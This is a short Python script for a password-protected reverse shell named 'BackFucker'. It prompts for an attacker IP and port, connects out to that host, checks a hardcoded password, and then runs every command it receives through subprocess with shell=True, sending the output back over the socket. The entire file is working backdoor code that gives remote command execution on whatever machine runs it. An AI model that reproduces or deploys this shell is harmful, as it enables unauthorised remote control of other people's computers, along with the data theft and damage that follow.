#!//usr/bin/python

import subprocess #Process commands
import socket #Process socket data
import pyfiglet

host = "" #Attack computer ip *Set this with the source code
port = "" #Port Attack
passwd = "s3cr3t" #Password

#Checking Password - 



def DisplayStart():
	ascii_banner = pyfiglet.figlet_format("BackFucker")
	print(ascii_banner)


                                                                                       
print(DisplayStart())


host = input("Enter your Host-IP: ")
print("")
port = input("Enter your Port: ")





def Login():
	global s
	s.send("Login: ")
	pwd = s.recv(1024)

	if pwd.strip() != passwd:
		Login()
	else:
		s.send("Connected #> ")
		Shell()


#Execute Shell Commands
def Shell():
	while True:
		data = s.recv(1024)

		if data.strip() == ":kill":
			break

		proc =  subprocess.Popen(data, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)
		output = proc.stdout.read() + proc.stderr.read()
		s.send(output)
		s.send("#> ")

#Start script
s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect((host,int(port)))
Login()


